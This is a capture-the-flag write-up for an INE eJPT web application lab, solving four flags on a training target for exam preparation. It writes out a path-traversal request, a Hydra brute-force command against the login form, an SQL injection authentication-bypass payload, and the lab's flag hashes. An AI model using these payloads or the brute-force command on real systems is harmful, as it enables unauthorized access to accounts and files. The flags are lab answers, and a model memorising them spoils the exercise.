# INE eJPT — Web Application Penetration Testing CTF 1

**Course:** INE / eJPT — Web Application Penetration Testing  
**Lab:** Web Application CTF 1  
**Author:** Zeliha Zengin

---

## Lab Environment

GUI access to a Kali machine is provided. The target website is at `http://target.ine.local`. **Objective:** identify web vulnerabilities and capture all flags.

- **Flag 1:** Important files hide in plain sight — check the root (`/`) directory for `flag.txt`.
- **Flag 2:** Explore the server's directory structure; enumeration reveals hidden treasures.
- **Flag 3:** The login form seems weak — try different combinations.
- **Flag 4:** The login form behaves oddly with unexpected input — think injection to reach the `admin` account.

Useful wordlists: `/usr/share/wordlists/dirb/common.txt` · `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` · `/root/Desktop/wordlists/100-common-passwords.txt`

**Tools used:** Nmap · Gobuster · Hydra · Burp Suite

> **Note:** Flag format is `FLAG1_MD5Hash` — submit only the hash (no underscore).

> *All work is performed against an authorized INE training lab for eJPT exam preparation.*

## Flag 1 — Local File Inclusion / path traversal

```bash
nmap -sV -sC -A -p- -Pn target.ine.local
dirb http://192.214.208.3
gobuster dir -u http://192.214.208.3 -w /usr/share/wordlists/dirb/common.txt
```

The site has a "View File" feature. The `file=` parameter is vulnerable to path traversal — add `../../../../` to climb to the filesystem root, and request `flag1.txt` instead of the default file:

```bash
http://target.ine.local/view_file?file=../../../../flag1.txt
```

> 🏁 **FLAG 1:** `fc36bf652cdb4804af157c32ae9ba1dd`

## Flag 2 — Directory enumeration

The Gobuster/dirb enumeration from Flag 1 also surfaces additional hidden paths. Browsing the discovered directories reveals the second flag.

> 🏁 **FLAG 2:** `90a7766ac5a8494c84bce2a648e9de17`

## Flag 3 — Brute-forcing the login form

Default credentials (`admin:admin`) return "Invalid username or password". Inspect the login form to find the field names (`username`, `password`) and the POST endpoint, then brute-force with Hydra:

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /root/Desktop/wordlists/100-common-passwords.txt \
  target.ine.local http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid username or password"
```

| Part | Meaning |
| --- | --- |
| `-L` | Username list |
| `-P` | Password list |
| `http-post-form` | Submit credentials via HTTP POST |
| `^USER^` / `^PASS^` | Placeholders filled from the lists |
| `Invalid username or password` | Failure string that marks a wrong attempt |

Found **guest : butterfly1**. Log in with the valid credentials to reveal the flag.

> 🏁 **FLAG 3:** `— (revealed after logging in as guest)`

## Flag 4 — SQL injection to bypass authentication

The login form mishandles unexpected input. A classic authentication-bypass payload logs you in as `admin`:

```bash
Username: admin' OR 1=1 -- -
Password: admin
```

The authentication check is bypassed and the session is elevated to admin privileges, revealing the flag.

> 🏁 **FLAG 4:** `834cdefcc5684a78a748fdaf866825d3`

## Summary

| Flag | Technique |
| --- | --- |
| 1 | Path traversal / LFI via the `file=` parameter |
| 2 | Directory enumeration (Gobuster / dirb) |
| 3 | Login brute-force with Hydra (http-post-form) |
| 4 | SQL injection authentication bypass |

### Key Takeaways

- Any `file=` style parameter deserves a path-traversal test (`../../../../`).
- Always enumerate directories — hidden paths hold flags and functionality.
- To brute-force a web login, Hydra needs the field names, the endpoint, and the failure string.
- `' OR 1=1 -- -` is the textbook SQLi auth-bypass; the fix is parameterized queries.

---

*Write-up by Zeliha Zengin · eJPT preparation*